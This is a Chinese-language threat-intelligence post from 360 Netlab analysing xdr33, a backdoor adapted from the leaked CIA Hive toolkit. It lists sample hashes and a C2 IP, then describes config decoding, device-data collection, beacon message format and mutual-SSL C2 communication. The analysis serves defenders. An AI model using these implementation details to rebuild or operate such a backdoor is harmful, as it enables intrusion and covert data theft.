<!doctype html>
<html lang="en">
 <head>
  <base href="https://blog.netlab.360.com/warning-hive-variant-xdr33-is-coming_cn/">
  <title>警惕：魔改后的CIA攻击套件Hive进入黑灰产领域</title>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="HandheldFriendly" content="True">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" type="text/css" href="/assets/built/screen.css?v=42b57cac00">
  <link rel="icon" href="https://blog.netlab.360.com/content/images/size/w256h256/2019/02/netlab_xs-2.png" type="image/png">
  <link rel="canonical" href="https://blog.netlab.360.com/warning-hive-variant-xdr33-is-coming_cn/">
  <meta name="referrer" content="no-referrer-when-downgrade">
  <link rel="amphtml" href="https://blog.netlab.360.com/warning-hive-variant-xdr33-is-coming_cn/amp/">
  <meta property="og:site_name" content="360 Netlab Blog - Network Security Research Lab at 360">
  <meta property="og:type" content="article">
  <meta property="og:title" content="警惕：魔改后的CIA攻击套件Hive进入黑灰产领域">
  <meta property="og:description" content="概述


2022年10月21日，360Netlab的蜜罐系统捕获了一个通过F5漏洞传播，VT 0检测的可疑ELF文件ee07a74d12c0bb3594965b51d0e45b6f，流量监控系统提示它和IP45.9.150.144产生了SSL流量，而且双方都使用了伪造的Kaspersky证书，这引起了我们的关注。经过分析，我们确认它由CIA被泄露的Hive项目server源码改编而来。这是我们首次捕获到在野的CIA HIVE攻击套件变种，基于其内嵌Bot端证书的CN=xdr33， 我们内部将其命名为xdr33。关于CIA的Hive项目，互联网中有大量的源码分析的文章，读者可自行参阅，此处不再展开。


概括来说，xdr33是一个脱胎于CIA Hive项目的后门木马，主要目的是收集敏感信息，为后续的入侵提供立足点。从网络通信来看，xdr33使用XTEA或AES算法对原始流量进行加密，并采用开启了Client-Certificate Authentication模式的SSL对流量做进一步的保护；从功能来说，主要有beacon，trigger两大任务，其中beacon是周期性向硬编码的Be">
  <meta property="og:url" content="https://blog.netlab.360.com/warning-hive-variant-xdr33-is-coming_cn/">
  <meta property="og:image" content="https://blog.netlab.360.com/content/images/2019/02/astronomy-constellation-dark-998641-4.jpg">
  <meta property="article:published_time" content="2023-01-09T03:13:20.000Z">
  <meta property="article:modified_time" content="2023-01-09T03:13:20.000Z">
  <meta property="article:tag" content="Botnet">
  <meta property="article:tag" content="xdr33">
  <meta property="article:tag" content="port knocking">
  <meta property="article:tag" content="Backdoor">
  <meta property="article:tag" content="CIA HIVE">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="警惕：魔改后的CIA攻击套件Hive进入黑灰产领域">
  <meta name="twitter:description" content="概述


2022年10月21日，360Netlab的蜜罐系统捕获了一个通过F5漏洞传播，VT 0检测的可疑ELF文件ee07a74d12c0bb3594965b51d0e45b6f，流量监控系统提示它和IP45.9.150.144产生了SSL流量，而且双方都使用了伪造的Kaspersky证书，这引起了我们的关注。经过分析，我们确认它由CIA被泄露的Hive项目server源码改编而来。这是我们首次捕获到在野的CIA HIVE攻击套件变种，基于其内嵌Bot端证书的CN=xdr33， 我们内部将其命名为xdr33。关于CIA的Hive项目，互联网中有大量的源码分析的文章，读者可自行参阅，此处不再展开。


概括来说，xdr33是一个脱胎于CIA Hive项目的后门木马，主要目的是收集敏感信息，为后续的入侵提供立足点。从网络通信来看，xdr33使用XTEA或AES算法对原始流量进行加密，并采用开启了Client-Certificate Authentication模式的SSL对流量做进一步的保护；从功能来说，主要有beacon，trigger两大任务，其中beacon是周期性向硬编码的Be">
  <meta name="twitter:url" content="https://blog.netlab.360.com/warning-hive-variant-xdr33-is-coming_cn/">
  <meta name="twitter:image" content="https://blog.netlab.360.com/content/images/2019/02/astronomy-constellation-dark-998641-4.jpg">
  <meta name="twitter:label1" content="Written by">
  <meta name="twitter:data1" content="Alex.Turing">
  <meta name="twitter:label2" content="Filed under">
  <meta name="twitter:data2" content="Botnet, xdr33, port knocking, Backdoor, CIA HIVE">
  <meta name="twitter:site" content="@360Netlab">
  <meta name="twitter:creator" content="@TuringAlex">
  <meta property="og:image:width" content="1200">
  <meta property="og:image:height" content="800">
  <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Article",
    "publisher": {
        "@type": "Organization",
        "name": "360 Netlab Blog - Network Security Research Lab at 360",
        "url": "https://blog.netlab.360.com/",
        "logo": {
            "@type": "ImageObject",
            "url": "https://blog.netlab.360.com/content/images/2019/02/netlab-brand-5.png"
        }
    },
    "author": {
        "@type": "Person",
        "name": "Alex.Turing",
        "image": {
            "@type": "ImageObject",
            "url": "https://blog.netlab.360.com/content/images/2019/06/turing.PNG",
            "width": 1200,
            "height": 1200
        },
        "url": "https://blog.netlab.360.com/author/alex/",
        "sameAs": [
            "https://twitter.com/TuringAlex"
        ]
    },
    "headline": "警惕：魔改后的CIA攻击套件Hive进入黑灰产领域",
    "url": "https://blog.netlab.360.com/warning-hive-variant-xdr33-is-coming_cn/",
    "datePublished": "2023-01-09T03:13:20.000Z",
    "dateModified": "2023-01-09T03:13:20.000Z",
    "keywords": "Botnet, xdr33, port knocking, Backdoor, CIA HIVE",
    "description": "概述\n\n\n2022年10月21日，360Netlab的蜜罐系统捕获了一个通过F5漏洞传播，VT 0检测的可疑ELF文件ee07a74d12c0bb3594965b51d0e45b6f，流量监控系统提示它和IP45.9.150.144产生了SSL流量，而且双方都使用了伪造的Kaspersky证书，这引起了我们的关注。经过分析，我们确认它由CIA被泄露的Hive项目server源码改编而来。这是我们首次捕获到在野的CIA HIVE攻击套件变种，基于其内嵌Bot端证书的CN&#x3D;xdr33， 我们内部将其命名为xdr33。关于CIA的Hive项目，互联网中有大量的源码分析的文章，读者可自行参阅，此处不再展开。\n\n\n概括来说，xdr33是一个脱胎于CIA Hive项目的后门木马，主要目的是收集敏感信息，为后续的入侵提供立足点。从网络通信来看，xdr33使用XTEA或AES算法对原始流量进行加密，并采用开启了Client-Certificate Authentication模式的SSL对流量做进一步的保护；从功能来说，主要有beacon，trigger两大任务，其中beacon是周期性向硬编码的Be",
    "mainEntityOfPage": "https://blog.netlab.360.com/warning-hive-variant-xdr33-is-coming_cn/"
}
    </script>
  <meta name="generator" content="Ghost 5.76">
  <link rel="alternate" type="application/rss+xml" title="360 Netlab Blog - Network Security Research Lab at 360" href="https://blog.netlab.360.com/rss/">
  <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/sodo-search.min.js" data-key="db8c743e6bb1457403d255d83f" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/main.css" data-sodo-search="https://blog.netlab.360.com/" crossorigin="anonymous"></script>
  <link href="https://blog.netlab.360.com/webmentions/receive/" rel="webmention">
  <script defer src="/public/cards.min.js?v=42b57cac00"></script>
  <link rel="stylesheet" type="text/css" href="/public/cards.min.css?v=42b57cac00">
  <style type="text/css">
	#ghost-portal-root {
        display: none;
    }
</style>
  <style>:root {--ghost-accent-color: #eca265;}</style>
  <meta http-equiv="X-Translated-By" content="Google">
  <meta http-equiv="X-Translated-To" content="en">
  <script type="text/javascript" src="https://www.gstatic.com/_/translate_http/_/js/k=translate_http.tr.pt_BR.xJ1CtmUvBec.O/am=DAY/d=1/rs=AN8SPfo94k2LWTu7fNiNbeqcVz9iNVvYQQ/m=corsproxy" data-sourceurl="https://blog.netlab.360.com/warning-hive-variant-xdr33-is-coming_cn/"></script>
  <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" rel="stylesheet">
  <script type="text/javascript" src="https://www.gstatic.com/_/translate_http/_/js/k=translate_http.tr.pt_BR.xJ1CtmUvBec.O/am=DAY/d=1/exm=corsproxy/ed=1/rs=AN8SPfo94k2LWTu7fNiNbeqcVz9iNVvYQQ/m=phishing_protection" data-phishing-protection-enabled="false" data-forms-warning-enabled="true" data-source-url="https://blog.netlab.360.com/warning-hive-variant-xdr33-is-coming_cn/"></script>
  <meta name="robots" content="none">
 </head>
 <body class="post-template tag-botnet tag-xdr33 tag-port-knocking tag-backdoor tag-cia-hive has-cover">
  <script type="text/javascript" src="https://www.gstatic.com/_/translate_http/_/js/k=translate_http.tr.pt_BR.xJ1CtmUvBec.O/am=DAY/d=1/exm=corsproxy,phishing_protection/ed=1/rs=AN8SPfo94k2LWTu7fNiNbeqcVz9iNVvYQQ/m=navigationui" data-environment="prod" data-proxy-url="https://blog-netlab-360-com.translate.goog" data-proxy-full-url="https://blog-netlab-360-com.translate.goog/warning-hive-variant-xdr33-is-coming_cn/?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp" data-source-url="https://blog.netlab.360.com/warning-hive-variant-xdr33-is-coming_cn/" data-source-language="auto" data-target-language="en" data-display-language="en" data-detected-source-language="zh-CN" data-is-source-untranslated="false" data-source-untranslated-url="https://translate.google.com/website?sl=auto&amp;tl=en&amp;hl=en&amp;client=webapp&amp;u=https://blog.netlab.360.com/warning-hive-variant-xdr33-is-coming_cn/&amp;anno=2" data-client="webapp"></script>
  <div class="viewport">
   <header id="gh-head" class="gh-head outer">
    <nav class="gh-head-inner inner">
     <div class="gh-head-brand"><a class="gh-head-logo" href="https://blog-netlab-360-com.translate.goog/warning-hive-variant-xdr33-is-coming_cn/?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp"> <img src="https://blog.netlab.360.com/content/images/2019/02/netlab-brand-5.png" alt="360 Netlab Blog - Network Security Research Lab at 360"> </a>
      <div class="gh-head-brand-wrapper"><button class="gh-search" data-ghost-search>
        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20">
         <path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
        </svg></button> <a class="gh-burger" role="button">
        <div class="gh-burger-box">
         <div class="gh-burger-inner"></div>
        </div></a>
      </div>
     </div>
     <div class="gh-head-menu">
      <ul class="nav">
       <li class="nav-botnet"><a href="https://blog-netlab-360-com.translate.goog/tag/botnet/?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp">Botnet</a></li>
       <li class="nav-dnsmon"><a href="https://blog-netlab-360-com.translate.goog/tag/dnsmon/?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp">DNSMon</a></li>
       <li class="nav-ddos"><a href="https://blog-netlab-360-com.translate.goog/tag/ddos/?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp">DDoS</a></li>
       <li class="nav-passivedns"><a href="https://blog-netlab-360-com.translate.goog/tag/pdns/?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp">PassiveDNS</a></li>
       <li class="nav-mirai"><a href="https://blog-netlab-360-com.translate.goog/tag/mirai/?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp">Mirai</a></li>
       <li class="nav-dta"><a href="https://blog-netlab-360-com.translate.goog/tag/dta/?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp">DTA</a></li>
      </ul>
     </div>
     <div class="gh-head-actions">
      <div class="gh-social"><a class="gh-social-link gh-social-twitter" href="https://translate.google.com/website?sl=auto&amp;tl=en&amp;hl=en&amp;client=webapp&amp;u=https://twitter.com/360Netlab" title="Twitter" target="_blank" rel="me noopener">
        <svg class="icon" viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="currentColor">
         <path d="M23.954 4.569c-.885.389-1.83.654-2.825.775 1.014-.611 1.794-1.574 2.163-2.723-.951.555-2.005.959-3.127 1.184-.896-.959-2.173-1.559-3.591-1.559-2.717 0-4.92 2.203-4.92 4.917 0 .39.045.765.127 1.124C7.691 8.094 4.066 6.13 1.64 3.161c-.427.722-.666 1.561-.666 2.475 0 1.71.87 3.213 2.188 4.096-.807-.026-1.566-.248-2.228-.616v.061c0 2.385 1.693 4.374 3.946 4.827-.413.111-.849.171-1.296.171-.314 0-.615-.03-.916-.086.631 1.953 2.445 3.377 4.604 3.417-1.68 1.319-3.809 2.105-6.102 2.105-.39 0-.779-.023-1.17-.067 2.189 1.394 4.768 2.209 7.557 2.209 9.054 0 13.999-7.496 13.999-13.986 0-.209 0-.42-.015-.63.961-.689 1.8-1.56 2.46-2.548l-.047-.02z" />
        </svg></a> <a class="gh-social-link gh-social-feedly" href="https://translate.google.com/website?sl=auto&amp;tl=en&amp;hl=en&amp;client=webapp&amp;u=https://feedly.com/i/subscription/feed/https://blog.netlab.360.com/rss/" title="RSS" target="_blank" rel="me noopener">
        <svg class="icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="currentColor">
         <circle cx="6.18" cy="17.82" r="2.18" /><path d="M4 4.44v2.83c7.03 0 12.73 5.7 12.73 12.73h2.83c0-8.59-6.97-15.56-15.56-15.56zm0 5.66v2.83c3.9 0 7.07 3.17 7.07 7.07h2.83c0-5.47-4.43-9.9-9.9-9.9z" />
        </svg></a>
      </div>
     </div>
    </nav>
   </header>
   <div class="site-content">
    <div class="floating-header">
     <div class="floating-header-logo"><a href="https://blog-netlab-360-com.translate.goog/warning-hive-variant-xdr33-is-coming_cn/?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp"> <img src="/content/images/size/w30/2019/02/netlab_xs-2.png" alt="360 Netlab Blog - Network Security Research Lab at 360 icon"> <span>360 Netlab Blog - Network Security Research Lab at 360</span> </a>
     </div><span class="floating-header-divider">—</span>
     <div class="floating-header-title">
      警惕：魔改后的CIA攻击套件Hive进入黑灰产领域
     </div>
     <div class="floating-header-share">
      <div class="floating-header-share-label">
       Share this 
       <svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24"><path d="M7.5 15.5V4a1.5 1.5 0 1 1 3 0v4.5h2a1 1 0 0 1 1 1h2a1 1 0 0 1 1 1H18a1.5 1.5 0 0 1 1.5 1.5v3.099c0 .929-.13 1.854-.385 2.748L17.5 23.5h-9c-1.5-2-5.417-8.673-5.417-8.673a1.2 1.2 0 0 1 1.76-1.605L7.5 15.5zm6-6v2m-3-3.5v3.5m6-1v2" />
       </svg>
      </div><a class="floating-header-share-tw" href="https://translate.google.com/website?sl=auto&amp;tl=en&amp;hl=en&amp;client=webapp&amp;u=https://twitter.com/share?text%3D%25E8%25AD%25A6%25E6%2583%2595%25EF%25BC%259A%25E9%25AD%2594%25E6%2594%25B9%25E5%2590%258E%25E7%259A%2584CIA%25E6%2594%25BB%25E5%2587%25BB%25E5%25A5%2597%25E4%25BB%25B6Hive%25E8%25BF%259B%25E5%2585%25A5%25E9%25BB%2591%25E7%2581%25B0%25E4%25BA%25A7%25E9%25A2%2586%25E5%259F%259F%26url%3Dhttps://blog.netlab.360.com/warning-hive-variant-xdr33-is-coming_cn/" onclick="window.open(this.href, 'share-twitter', 'width=550,height=235');return false;">
       <svg class="icon" viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="currentColor">
        <path d="M23.954 4.569c-.885.389-1.83.654-2.825.775 1.014-.611 1.794-1.574 2.163-2.723-.951.555-2.005.959-3.127 1.184-.896-.959-2.173-1.559-3.591-1.559-2.717 0-4.92 2.203-4.92 4.917 0 .39.045.765.127 1.124C7.691 8.094 4.066 6.13 1.64 3.161c-.427.722-.666 1.561-.666 2.475 0 1.71.87 3.213 2.188 4.096-.807-.026-1.566-.248-2.228-.616v.061c0 2.385 1.693 4.374 3.946 4.827-.413.111-.849.171-1.296.171-.314 0-.615-.03-.916-.086.631 1.953 2.445 3.377 4.604 3.417-1.68 1.319-3.809 2.105-6.102 2.105-.39 0-.779-.023-1.17-.067 2.189 1.394 4.768 2.209 7.557 2.209 9.054 0 13.999-7.496 13.999-13.986 0-.209 0-.42-.015-.63.961-.689 1.8-1.56 2.46-2.548l-.047-.02z" />
       </svg></a> <a class="floating-header-share-fb" href="https://translate.google.com/website?sl=auto&amp;tl=en&amp;hl=en&amp;client=webapp&amp;u=https://www.facebook.com/sharer/sharer.php?u%3Dhttps://blog.netlab.360.com/warning-hive-variant-xdr33-is-coming_cn/" onclick="window.open(this.href, 'share-facebook','width=580,height=296');return false;">
       <svg class="icon" viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="currentColor">
        <path d="M23.9981 11.9991C23.9981 5.37216 18.626 0 11.9991 0C5.37216 0 0 5.37216 0 11.9991C0 17.9882 4.38789 22.9522 10.1242 23.8524V15.4676H7.07758V11.9991H10.1242V9.35553C10.1242 6.34826 11.9156 4.68714 14.6564 4.68714C15.9692 4.68714 17.3424 4.92149 17.3424 4.92149V7.87439H15.8294C14.3388 7.87439 13.8739 8.79933 13.8739 9.74824V11.9991H17.2018L16.6698 15.4676H13.8739V23.8524C19.6103 22.9522 23.9981 17.9882 23.9981 11.9991Z" />
       </svg></a>
     </div><progress id="reading-progress" class="progress" value="0">
      <div class="progress-container"><span class="progress-bar"></span>
      </div></progress>
    </div>
    <main id="site-main" class="site-main">
     <article class="article post tag-botnet tag-xdr33 tag-port-knocking tag-backdoor tag-cia-hive no-image ">
      <header class="article-header gh-canvas">
       <div class="article-tag post-card-tags"><span class="post-card-primary-tag"> <a href="https://blog-netlab-360-com.translate.goog/tag/botnet/?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp">Botnet</a> </span>
       </div>
       <h1 class="article-title">警惕：魔改后的CIA攻击套件Hive进入黑灰产领域</h1>
       <div class="article-byline">
        <section class="article-byline-content">
         <ul class="author-list">
          <li class="author-list-item"><a href="https://blog-netlab-360-com.translate.goog/author/alex/?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp" class="author-avatar"> <img class="author-profile-image" src="/content/images/2019/06/turing.PNG" alt="Alex.Turing"> </a></li>
          <li class="author-list-item"><a href="https://blog-netlab-360-com.translate.goog/author/huiwang/?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp" class="author-avatar"> <img class="author-profile-image" src="/content/images/2017/05/WechatIMG1.jpeg" alt="Hui Wang"> </a></li>
         </ul>
         <div class="article-byline-meta">
          <h4 class="author-name"><a href="https://blog-netlab-360-com.translate.goog/author/alex/?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp">Alex.Turing</a>, <a href="https://blog-netlab-360-com.translate.goog/author/huiwang/?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp">Hui Wang</a></h4>
          <div class="byline-meta-content"><time class="byline-meta-date" datetime=" 2023-01-09">Jan 9, 2023</time> <span class="byline-reading-time"><span class="bull">•</span> 17 min read</span>
          </div>
         </div>
        </section>
       </div>
      </header>
      <section class="gh-content gh-canvas"><!--kg-card-begin: markdown-->
       <h1 id>概述</h1>
       <p>2022年10月21日，360Netlab的蜜罐系统捕获了一个通过F5漏洞传播，VT 0检测的可疑ELF文件<code>ee07a74d12c0bb3594965b51d0e45b6f</code>，流量监控系统提示它和IP<code>45.9.150.144</code>产生了SSL流量，而且双方都使用了<strong>伪造的Kaspersky证书</strong>，这引起了我们的关注。经过分析，我们确认它由CIA被泄露的Hive项目server源码改编而来。<strong>这是我们首次捕获到在野的CIA HIVE攻击套件变种</strong>，基于其内嵌Bot端证书的<strong>CN=xdr33</strong>， 我们内部将其命名为<strong>xdr33</strong>。关于CIA的Hive项目，互联网中有大量的源码分析的文章，读者可自行参阅，此处不再展开。</p>
       <p>概括来说，xdr33是一个脱胎于CIA Hive项目的后门木马，主要目的是收集敏感信息，为后续的入侵提供立足点。从网络通信来看，xdr33使用XTEA或AES算法对原始流量进行加密，并采用开启了<strong>Client-Certificate Authentication</strong>模式的SSL对流量做进一步的保护；从功能来说，主要有<code>beacon，trigger</code>两大任务，其中<strong>beacon</strong>是周期性向硬编码的Beacon C2上报设备敏感信息，执行其下发的指令，而<strong>trigger</strong>则是监控网卡流量以识别暗藏Trigger C2的特定报文，当收到此类报文时，就和其中的Trigger C2建立通信，并等待执行下发的指令。</p>
       <p>功能示意图如下所示：</p>
       <p><a href="https://blog-netlab-360-com.translate.goog/content/images/2022/12/hive_function.png?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp"><img src="https://blog.netlab.360.com/content/images/2022/12/hive_function.png" class="kg-image"></a></p>
       <p>Hive使用<strong>BEACON_HEADER_VERSION</strong>宏定义指定版本，在源码的Master分支上，它的值<code>29</code>，而xdr33中值为<code>34</code>，或许xdr33在视野之外已经有过了数轮的迭代更新。和源码进行对比，xdr33的更新体现在以下5个方面:</p>
       <ul>
        <li>添加了新的CC指令</li>
        <li>对函数进行了封装或展开</li>
        <li>对结构体进行了调序，扩展</li>
        <li>Trigger报文格式</li>
        <li>Beacon任务中加入CC操作</li>
       </ul>
       <p>xdr33的这些修改在实现上来看不算非常精良，再加上此次传播所所用的漏洞为N-day，因此我们倾向于排除CIA在泄漏源码上继续改进的可能性，认为它是黑产团伙利用已经泄漏源码魔改的结果。考虑到原始攻击套件的巨大威力，这绝非安全社区乐见，我们决定编写本文向社区分享我们的发现，共同维护网络空间的安全。</p>
       <h1 id="payload">漏洞投递Payload</h1>
       <p>我们捕获的Payload的md5为<code>ad40060753bc3a1d6f380a5054c1403a</code>，它的内容如下所示：</p>
       <p><a href="https://blog-netlab-360-com.translate.goog/content/images/2022/12/hive_logd.png?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp"><img src="https://blog.netlab.360.com/content/images/2022/12/hive_logd.png" class="kg-image"></a></p>
       <p>代码简单明了，它的主要目的是：</p>
       <p>1：下载下一阶段的样本并将其伪装成<code>/command/bin/hlogd</code>。</p>
       <p>2：安装<code>logd</code>服务以实现持久化。</p>
       <h1 id>样本分析</h1>
       <p>我们只捕获了一个X86 架构的xdr33样本，它的基本信息如下所示：</p>
       <pre><code>MD5:ee07a74d12c0bb3594965b51d0e45b6f
ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, stripped
Packer: None
</code></pre>
       <p>简单来说，<strong>xdr33</strong>在被侵入的设备运行时，首先解密所有的配置信息，然后检查是否有root/admin权限，如果没有，则输出<code>Insufficient permissions. Try again...</code>并退出；反之就初始化各种运行时参数，如C2，PORT，运行间隔时间等。最后通过<strong>beacon_start</strong>，<strong>TriggerListen</strong>两个函数开启Beacon，Trigger两大任务。</p>
       <p><a href="https://blog-netlab-360-com.translate.goog/content/images/2022/12/hive_main.png?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp"><img src="https://blog.netlab.360.com/content/images/2022/12/hive_main.png" class="kg-image"></a></p>
       <p>下文主要从2进制逆向的角度出发，分析Beacon，Trigger功能的实现；同时结合源码进行比对分析，看看发生了哪些变化。</p>
       <h3 id>解密配置信息</h3>
       <p>xdr33通过以下代码片段<strong>decode_str</strong>解密配置信息，它的逻辑非常简单即<strong>逐字节取反</strong>。</p>
       <p><a href="https://blog-netlab-360-com.translate.goog/content/images/2022/12/hive_decode.png?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp"><img src="https://blog.netlab.360.com/content/images/2022/12/hive_decode.png" class="kg-image"></a></p>
       <p>在IDA中可以看到decode_str的交叉引用非常多，一共了152处。为了辅助分析，我们实现了附录中IDAPython脚本 Decode_RES，对配置信息进行解密。</p>
       <p><a href="https://blog-netlab-360-com.translate.goog/content/images/2022/12/hive_idaxref.png?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp"><img src="https://blog.netlab.360.com/content/images/2022/12/hive_idaxref.png" class="kg-image"></a></p>
       <p>解密结果如下所示，其中有<code>Beacon C2</code> <strong>45.9.150.144</strong>，运行时提示信息，查看设备信息的命令等。</p>
       <p><a href="https://blog-netlab-360-com.translate.goog/content/images/2022/12/hive_config.png?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp"><img src="https://blog.netlab.360.com/content/images/2022/12/hive_config.png" class="kg-image"></a></p>
       <h1 id="beacontask">Beacon Task</h1>
       <p>Beacon的主要功能是周期性的收集PID，MAC，SystemUpTime，进程以及网络相关的设备信息；然后使用bzip，XTEA算法对设备信息进行压缩，加密，并上报给C2；最后等待执行C2下发的指令 。</p>
       <h2 id="0x01">0x01: 信息收集</h2>
       <ul>
        <li><p>MAC</p><p>通过<code>SIOCGIFCON</code> 或 <code>SIOCGIFHWADDR</code>查询MAC</p><p><a href="https://blog-netlab-360-com.translate.goog/content/images/2022/12/hive_mac-1.png?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp"><img src="https://blog.netlab.360.com/content/images/2022/12/hive_mac-1.png" class="kg-image"></a></p></li>
        <li><p>SystemUpTime</p><p>通过/proc/uptime收集系统的运行时间</p><p><a href="https://blog-netlab-360-com.translate.goog/content/images/2022/12/hive_uptime.png?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp"><img src="https://blog.netlab.360.com/content/images/2022/12/hive_uptime.png" class="kg-image"></a></p></li>
        <li><p>进程以及网络相关的信息</p><p>通过执行以下4个命令收集<strong>进程，网卡，网络连接，路由</strong>等信息</p><p><a href="https://blog-netlab-360-com.translate.goog/content/images/2022/12/hive_netinfo.png?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp"><img src="https://blog.netlab.360.com/content/images/2022/12/hive_netinfo.png" class="kg-image"></a></p></li>
       </ul>
       <h2 id="0x02">0x02: 信息处理</h2>
       <p>Xdr33通过update_msg函数将不同的设备信息组合在一起</p>
       <p><a href="https://blog-netlab-360-com.translate.goog/content/images/2022/12/hive_compose.png?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp"><img src="https://blog.netlab.360.com/content/images/2022/12/hive_compose.png" class="kg-image"></a></p>
       <p>为了区别不同的设备信息，Hive设计了ADD_HDR，它的定义如下所示，上图中的“3，4，5，6”就代表了不同的Header Type。</p>
       <pre><code>typedef struct __attribute__ ((packed)) add_header {
	unsigned short type;
	unsigned short length;
} ADD_HDR;

</code></pre>
       <p>那“3，4，5，6”具体代表什么类型呢？这就要看下图源码中Header Types的定义了。xdr33在此基础上进行了扩展，新增了0，9俩个值，分别代表<strong>Sha1[:32] of MAC</strong>，以及<strong>PID of xdr33</strong>。</p>
       <p><a href="https://blog-netlab-360-com.translate.goog/content/images/2022/12/hive_type.png?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp"><img src="https://blog.netlab.360.com/content/images/2022/12/hive_type.png" class="kg-image"></a></p>
       <p>xdr32在虚拟机中的收集到的部分信息如下所示，可以看出它包含了head type为0,1,2,7,9,3的设备信息。<br><a href="https://blog-netlab-360-com.translate.goog/content/images/2022/12/hive_deviceinfo.png?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp"><img src="https://blog.netlab.360.com/content/images/2022/12/hive_deviceinfo.png" class="kg-image"></a></p>
       <p>值得一提的是type=0，Sha1[:32] of MAC，它的意思是取MAC SHA1的前32字节。以上图中的的mac为例，它的计算过程如下：</p>
       <pre><code>mac:00-0c-29-94-d9-43,remove "-"
result:00 0c 29 94 d9 43

sha1 of mac:
result:c55c77695b6fd5c24b0cf7ccce3e464034b20805

sha1[:32] of mac:
result:c55c77695b6fd5c24b0cf7ccce3e4640
</code></pre>
       <p>当所有的设备信息组合完毕后，使用bzip进行压缩，并在头部增加2字节的beacon_header_version，以及2字节的OS信息。<br><a href="https://blog-netlab-360-com.translate.goog/content/images/2023/01/hive_devicebzip.png?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp"><img src="https://blog.netlab.360.com/content/images/2023/01/hive_devicebzip.png" class="kg-image"></a></p>
       <h2 id="0x03">0x03: 网络通信</h2>
       <p>xdr33与Beacon C2通信过程，包含以下4个步骤，下文将详细分析各个步骤的细节。</p>
       <ul>
        <li>双向SSL认证</li>
        <li>获取XTEA密钥</li>
        <li>向C2上报XTEA加密的设备信息</li>
        <li>执行C2下发的指令</li>
       </ul>
       <h3 id="step1ssl">Step1: 双向SSL认证</h3>
       <p>所谓双向SSL认证，即要求Bot，C2要确认彼此的身份，从网络流量层面来看，可以很明显看到Bot，C2相互请求彼此证书并校验的过程。<br><a href="https://blog-netlab-360-com.translate.goog/content/images/2022/12/hive_certi.png?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp"><img src="https://blog.netlab.360.com/content/images/2022/12/hive_certi.png" class="kg-image"></a></p>
